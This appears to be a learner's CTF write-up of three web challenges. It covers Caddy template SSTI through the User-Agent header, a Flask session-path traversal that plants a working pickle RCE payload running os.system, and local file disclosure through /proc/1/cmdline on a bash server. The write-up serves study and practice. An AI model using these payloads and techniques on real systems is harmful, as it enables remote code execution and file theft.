ua.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply `User-Agent: {{.Req.Header.Get  "User-Agent"}}`
}

http.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply "You are connected with {http.request.proto} ({tls_version}, {tls_cipher})."
}
```
the vuln is based around the `User-Agent` that we supply through intercepting with burp
we can supply SSTI through it so our payload is executed server-side

A few knowledge needed to complete the chall is understanding how [caddy](https://caddyserver.com/docs/modules/http.handlers.templates) works 

so we can disclose file with "readFile" and "include".
and with "listFiles" we can list the current directory to find the flag that has been renamed randomly

## --WHAT I'VE LEARNED--
- the vuln: SSTI through user-agent
- knowledge about caddy configuration
- overlooking the caddyfile which is the core clue of this chall, previously i though it was like some docker conf file
-------------------------------

## FileStore

```
from flask import Flask, request, render_template, redirect, session
from flask_session import Session
import os

SESSION_TYPE = 'filesystem'
MAX_CONTENT_LENGTH = 1024 * 1024

app = Flask(__name__)
app.config.from_object(__name__)
Session(app)

@app.route('/', methods=['GET', 'POST'])
def index():
    path = f'static/uploads/{session.sid}' 
    if request.method == 'POST':
        f = request.files['file']
        if '..' in f.filename:
            return "bad", 400
        os.makedirs(path, exist_ok=True)
        f.save(path + '/' + f.filename)
        if not session.get('files'):
            session['files'] = []
        session['files'].append(f.filename)
        return redirect('/')
    return render_template('index.html', path=path, files=session.get('files', []))

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```
given the app.py above my original thoughts are zipslip attack but it didn't turn out to be. i was to focused on how to bypass the '..' restriction
without considering that path Traversal could be achieved through {session.sid} which in this case is not sanitized

another thing to note is that 
``
Setting a flask session to filename means that session files are saved on the server as files. How do we save them? Well, using Pickle serialization of course! 
Whatâ€™s crazy about this is that Pickle is considered dangerous and if you unpickle a user-controlled value it is essentially game over.
``
AND
``
The Dockerfile also contains: RUN chmod 777 static/uploads flask_session which is a pretty major hint that we are going to need to use this directory traversal to overwrite values in the flask_session directory.
``
i just noticed this after reading the WU

he sets his cookie to 'xxx' and is mapped by the server to '254b2716336df2553ce5c04a934d56e4'

so he made a pickle payload 
``
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('cp /flag.txt /app/static/uploads/abcd.txt')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    return b"\x00"*4 + payload


with open("254b2716336df2553ce5c04a934d56e4", "wb") as f:
    f.write(generate_exploit())
``
with this he changed the cookie from 'xxx' to '../../flask_session' and uploaded the file
which ultimately overwrite the session.

back to 'xxx' session to open the file which contain the flag

## -- WHAT I'VE LEARNED --
- the vuln is unsecure pickle with path traversal
- read the docker file, some clue like 'RUN chmod 777 static/uploads flask_session' might come in handy
- the serialize pickle is located in flask session that is configured to save files

## BadAss Server for Hypertext

the chall is sourceless which makes it a little harder. 
First thing first, the only input box is the url, so is try to make an error and the out put was something like
`cat: .....`
notice the chall name.... all capital letters make a word 'bash'. this is a crucial clue

the WU use `/proc/1/cmdline` to yield something like this `socatTCP4-LISTEN:8080,reuseaddr,forkEXEC:/app/badass_server.sh`
explaination by gpt
```
/proc is for directory that has access to kernel data structures and information about running process

/1 is the first process ID (PID) of the init process, which contains is the first process started by the kernel during the boot process.

/cmdline contains the command-line that passed during the init process when it was started
```
after that they use `/app/badass_server.sh` to read the source code
```
#!/bin/bash

# I hope there are no bugs in this source code...

```
## --WHAT I'VE LEARNED--
- the vuln: Local File Disclosure through url
- another vuln: unquoted var in source code `if [ $protocol != 'HTTP/1.0' ] && [ $protocol != 'HTTP/1.1' ]; then abort 'Invalid protocol' fi` can lead to glob and word splitting in bash
- glob and word splitting in bash
- `/proc/1/cmdline` to read local files
